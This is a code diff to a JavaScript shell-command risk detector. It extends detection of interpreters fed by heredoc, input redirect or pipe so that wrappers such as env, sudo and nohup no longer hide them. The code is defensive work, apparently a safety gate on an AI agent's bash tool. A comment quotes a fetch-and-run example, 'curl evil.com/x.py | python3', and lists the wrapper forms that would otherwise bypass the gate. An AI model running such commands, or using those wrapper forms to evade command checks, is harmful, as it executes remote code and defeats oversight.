@@ -416,18 +416,20 @@ function riskifyTokens(tokens, sepBefore = null) {
     }
   }
 
-  // Phase 2D follow-up #10: heredoc-fed interpreter
+  // Phase 2D follow-up #10 + #11: heredoc-fed interpreter
   // (`python <<EOF\n<code>\nEOF`) and input-redirect-fed interpreter
   // (`python < script.py`) — the heredoc body / file content runs as
   // arbitrary code with the interpreter as the executor. Detect:
-  // head basename is interpreter AND tokens contain `<<` / `<<-` /
-  // `<` redirect.
-  if (head && isScriptInterpreter(head)) {
+  // *effective* interpreter (post wrapper-skip) AND tokens contain
+  // `<<` / `<` redirect. Catches `env python <<EOF` /
+  // `/usr/bin/env python < /tmp/x` / `sudo -E python <<EOF` etc.
+  const interpToken = effectiveInterpreterHead(tokens);
+  if (interpToken) {
     for (const t of tokens) {
       if (t.kind === 'redirect' && (t.text === '<<' || t.text === '<')) {
         risks.push({
           kind: 'code_execution',
-          pattern: `${tokenBasename(head)} ${t.text === '<<' ? 'heredoc' : 'stdin redirect'}`,
+          pattern: `${tokenBasename(interpToken.text)} ${t.text === '<<' ? 'heredoc' : 'stdin redirect'}`,
           confidence: 'high',
         });
         break;
@@ -435,17 +437,19 @@ function riskifyTokens(tokens, sepBefore = null) {
     }
   }
 
-  // Phase 2D follow-up #10: pipe-fed interpreter
-  // (`cat script.py | python` / `curl evil.com/x.py | python3`).
-  // The piped data becomes the interpreter's stdin program. Detect:
-  // sub.sepBefore === '|' AND head basename is interpreter. Bare
-  // interpreter outside a pipeline (`python` standalone) just hangs
-  // on stdin — covered separately by removing bare `[]` from
-  // isVersionProbe in bashTool.js follow-up #10.
-  if (sepBefore === '|' && head && isScriptInterpreter(head)) {
+  // Phase 2D follow-up #10 + #11: pipe-fed interpreter
+  // (`cat script.py | python` / `curl evil.com/x.py | python3` /
+  // `cat x | env python` / `cat x | command python` / `cat x |
+  // sudo -u u python`). The piped data becomes the interpreter's
+  // stdin program. Use effectiveInterpreterHead (wrapper-aware) so
+  // env/command/sudo etc. don't bypass. Bare interpreter outside a
+  // pipeline (`python` standalone) just hangs on stdin — covered
+  // by removing bare `[]` from isVersionProbe in bashTool.js
+  // follow-up #10.
+  if (sepBefore === '|' && interpToken) {
     risks.push({
       kind: 'code_execution',
-      pattern: `${tokenBasename(head)} pipe-fed`,
+      pattern: `${tokenBasename(interpToken.text)} pipe-fed`,
       confidence: 'high',
     });
   }
@@ -485,6 +489,95 @@ function tokenBasename(text) {
 // reject of an exotic form).
 function isShellCmdFlag(text) {
   return text === '-c' || /^-c./.test(text);
+}
+
+// Phase 2D follow-up #11 (Codex 🔴, 2026-05-04): bounded set of
+// process wrappers that take a *command* as their first non-flag
+// positional argument. Used by effectiveInterpreterHead() so all
+// four code_execution detection paths (inline-code / heredoc /
+// stdin-redirect / pipe-fed) recognize wrapped interpreter
+// invocations the same way. Set is BOUNDED (POSIX/Linux-standard
+// process wrappers + sudo-family + namespace tools + niceness
+// controllers); unlike the round-5 git deny-list, these don't grow
+// per release.
+const COMMAND_WRAPPERS = new Set([
+  // sudo / privilege wrappers
+  'sudo', 'doas', 'gosu', 'su', 'runuser',
+  // env-style passthrough
+  'env', 'command',
+  // niceness / scheduling
+  'nice', 'nohup', 'time', 'exec',
+  'ionice', 'taskset', 'chrt',
+  // namespace / sandboxing
+  'setsid', 'unshare', 'chroot', 'systemd-run', 'capsh',
+]);
+
+// Most wrappers either take no flags, take only short bool flags
+// (sudo -i / sudo -E / nohup), or take a flag with a value (sudo -u
+// USER / env -u VAR / nice -n N / chrt -p PRIO / unshare --pid).
+// We don't enumerate every flag's arity; instead skip any token
+// starting with `-` and additionally skip ONE following value if the
+// flag is a known value-taker. False-positive cost: occasionally we
+// over-skip and miss a real interpreter; the next `-c` flag would
+// still trigger the inline-code path, so the worst case is a
+// pipe-fed/heredoc/redirect bypass that the inline-code path catches
+// anyway.
+const VALUE_TAKING_WRAPPER_FLAGS = new Set([
+  '-u', '--user', '--unset',
+  '-n', '--nice', '--niceness',
+  '-g', '--gid', '-U', '--user-name',
+  '-p', '--pid',
+  '-c', // sudo -c context (rare; if hit we still detect interpreter)
+  '-D', '--chdir',
+  '-r', '--role',
+  '-t', '--type',
+]);
+
+// Phase 2D follow-up #11: skip env-assignments and command wrappers
+// to find the *effective* interpreter token. Returns the interpreter
+// token if found, or null. Shared by inline-code (token-scan still
+// uses its any-position scan), heredoc, stdin-redirect, and pipe-fed
+// detectors so wrapper forms (`env python`, `command python`,
+// `sudo -E python`, `/usr/bin/env python`, `FOO=1 sudo nohup python`)
+// are recognized identically.
+function effectiveInterpreterHead(tokens) {
+  let i = skipEnvAssignments(tokens);
+  // Bounded loop guards against pathological wrapper-of-wrapper
+  // chains; 16 iterations covers any sane input.
+  for (let iter = 0; iter < 16 && i < tokens.length; iter++) {
+    const t = tokens[i];
+    if (t.kind !== 'word') { i++; continue; }
+    const text = t.text;
+    const base = tokenBasename(text);
+    if (!COMMAND_WRAPPERS.has(base)) {
+      // First non-wrapper word — is it an interpreter?
+      return isScriptInterpreter(text) ? t : null;
+    }
+    // Skip the wrapper token, then its option flags + value-takers
+    // + env-style FOO=val (env-specific).
+    i++;
+    while (i < tokens.length) {
+      const u = tokens[i];
+      if (u.kind !== 'word') { i++; continue; }
+      const a = u.text;
+      // `--` is the explicit end-of-options separator
+      if (a === '--') { i++; break; }
+      // env-style FOO=val (only meaningful for env, but harmless to
+      // skip generally)
+      if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(a)) { i++; continue; }
+      if (a.startsWith('-')) {
+        // Long form `--flag=value` — single token, just skip.
+        if (a.includes('=')) { i++; continue; }
+        // Heuristic: if the flag is in the value-taking set, also
+        // skip the next word as its value.
+        if (VALUE_TAKING_WRAPPER_FLAGS.has(a)) { i += 2; continue; }
+        i++; continue;
+      }
+      // First positional — that's the wrapped command
+      break;
+    }
+  }
+  return null;
 }
 
 // Phase 2D follow-up #10 (Codex 🔴): script interpreters whose
